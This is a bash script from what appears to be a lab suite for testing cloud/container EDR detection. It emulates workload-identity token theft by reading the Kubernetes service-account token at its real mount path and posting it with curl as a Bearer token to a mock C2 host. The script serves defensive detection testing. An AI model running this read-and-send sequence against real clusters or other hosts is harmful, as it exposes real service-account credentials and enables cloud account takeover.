#!/bin/bash
#
# simulate-workload-identity-theft.sh
# ---------------------------------------------------------------------------
# CLOUD/CONTAINER EDR (CDR) DETECTION TEST — LAB USE ONLY
#
# Emulates theft and reuse of a Kubernetes/cloud workload-identity token —
# the container-native sibling of the IMDS-credential-theft scenario.
# Reads the decoy service-account token seeded by seed-decoys.sh at its
# REAL mount path, then presents it as a Bearer token to the lab's mock
# cloud/K8s token-exchange endpoint (mock-c2's /cloud/identity). The token
# is decoy content with a JWT-shaped encoding, not a usable credential.
#
#   discover workload-identity token file    Unsecured Credentials: Container API (T1552.007)
#   present stolen token to a cloud API       Steal Application Access Token       (T1528)
# ---------------------------------------------------------------------------
set -u

RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
C2_HOST="${C2_HOST:-mock-c2}"
C2_PORT="${C2_PORT:-8443}"
SA_DIR="/var/run/secrets/kubernetes.io/serviceaccount"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/identitytheft_${SESSION}.log"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "CDR test lab :: workload-identity-theft emulation :: session=$SESSION"

step "discovery — find the mounted workload-identity token (ATT&CK T1552.007)"
if [ ! -f "${SA_DIR}/token" ]; then
    say "!! no decoy token found — run: bash test-scripts/seed-decoys.sh first"
    exit 1
fi
find /var/run/secrets -type f 2>/dev/null | tee -a "$LOG"
TOKEN="$(cat "${SA_DIR}/token")"
NAMESPACE="$(cat "${SA_DIR}/namespace" 2>/dev/null || echo unknown)"
say "discovered token for namespace='${NAMESPACE}' (${#TOKEN} chars)"

step "credential use — present stolen token to a cloud/K8s API (ATT&CK T1528)"
RESP="$(curl -s --max-time 5 -X POST \
    -H "Authorization: Bearer ${TOKEN}" \
    -d "namespace=${NAMESPACE}" \
    "http://${C2_HOST}:${C2_PORT}/cloud/identity")"
say "token-exchange response: $RESP"

step "Done — workload-identity-theft emulation complete."
say "artifacts: $LOG  (server-side log: results/mock_c2_beacons.log)"
